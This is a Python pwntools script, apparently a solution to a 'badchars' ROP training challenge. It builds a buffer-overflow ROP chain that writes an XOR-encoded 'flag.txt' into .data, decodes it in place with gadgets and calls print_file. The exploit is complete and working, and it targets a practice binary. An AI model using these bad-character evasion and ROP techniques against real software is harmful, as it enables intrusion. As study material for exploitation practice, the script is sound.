"""
This challenge is almost identical to the last, but this time we have to deal
with badchars: 'x', 'g', 'a', and '.'.

The usefulGadgets() function contains:

0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
0x000000000040062b <+3>:     ret
0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
0x000000000040062f <+7>:     ret
0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
0x0000000000400633 <+11>:    ret
0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
0x0000000000400638 <+16>:    ret
0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]

We'll XOR "flag.txt" with a key e.g. 0x3, and write the result to `.data`.
Then we use gadgets to XOR-decrypt each byte at runtime.

1. Load the XOR'd string into memory using `move [r13], r12`
2. For each byte, XOR-decrypt it in-place with `xor [r15], r14b`
3. Pass the final string to `print_file()` using `pop rdi; ret`.
"""

from pwn import *


def xor_no_badchars(val, badchars=b"xga."):
    """XOR `val` with a key that results in no badchars."""
    for key in range(1, 256):
        enc = bytes(c ^ key for c in val)
        if any(c in badchars for c in enc):
            continue
        return enc, key
    raise RuntimeError("Could not XOR value without badchars.")


context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = "./badchars"
p = process(bin)
# gdb.attach(p, api=True)

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

bin = "./badchars"
p = process(bin)
# gdb.attach(p, api=True)
e = ELF(bin)
rop = ROP(e)

# Gadget addresses

# NOTE: pwntools can only find simple gadgets, see:
# <https://github.com/Gallopsled/pwntools/issues/1492>. So, we instead hardcode
# the below instead of using rop.find_gadget().

# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret
xor_r15_r14_ret_addr = 0x400628
info(f"xor_r15_r14_ret_addr ={hex(xor_r15_r14_ret_addr)}")

# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
mov_r13_r12_ret_addr = 0x400634
info(f"mov_r13_r12_ret_addr ={hex(mov_r13_r12_ret_addr)}")

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12_r13_r14_r15_ret_addr = 0x40069C
info(f"pop_r12_r13_r14_r15_ret_addr ={hex(pop_r12_r13_r14_r15_ret_addr)}")

# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
pop_r14_r15_ret_addr = 0x4006A0
info(f"pop_r14_r15_ret_addr ={hex(pop_r14_r15_ret_addr)}")

# 0x0000000000400693 : pop rdi ; ret
pop_rdi_ret_addr = rop.find_gadget(["pop rdi", "ret"]).address

# Address of the `.data` section at runtime
data_section_addr = e.get_section_by_name(".data").header.sh_addr

# NOTE: We XOR-decrypt each byte at `data_section_addr + i` in the ROP chain
# below. One of these (0x60102e) has a bad char ('.' == 0x2e) as its LSB, which
# the binary scrubs on input, corrupting the address and breaking decryption.
# To fix this, we shift the data address by 8 to avoid bad chars in any
# XOR loop ROP chain element.
data_section_addr += 8

# Address of `print_file()` in PLT
print_file_plt = e.plt["print_file"]

# XOR the "flag.txt" string with a key
flag_str, key = xor_no_badchars(b"flag.txt")
info(f"XOR'd string with key={hex(key)} resulted in val={flag_str.hex()}")

# Construct the ROP payload

payload = b"A" * 32
payload += b"B" * 8  # Saved RBP

# Write the encoded flag string to `.data`
payload += p64(pop_r12_r13_r14_r15_ret_addr)
payload += p64(u64(flag_str))  # r12 = XOR'd flag string
payload += p64(data_section_addr)  # r13 = `.data` destination
payload += p64(0xDEADC0DEDEADC0DE)  # r14 junk
payload += p64(0xDEADC0DEDEADC0DE)  # r15 junk
payload += p64(mov_r13_r12_ret_addr)

# XOR-decrypt each byte in-place
for i in range(len(flag_str)):
    payload += p64(pop_r14_r15_ret_addr)
    payload += p64(key)  # r14 = XOR key
    payload += p64(data_section_addr + i)  # r15 = target address
    payload += p64(xor_r15_r14_ret_addr)

# Call `print_file()`
payload += p64(pop_rdi_ret_addr)
payload += p64(data_section_addr)
payload += p64(print_file_plt)

p.sendafter(b"> ", payload)
p.recvline()
p.recvline()
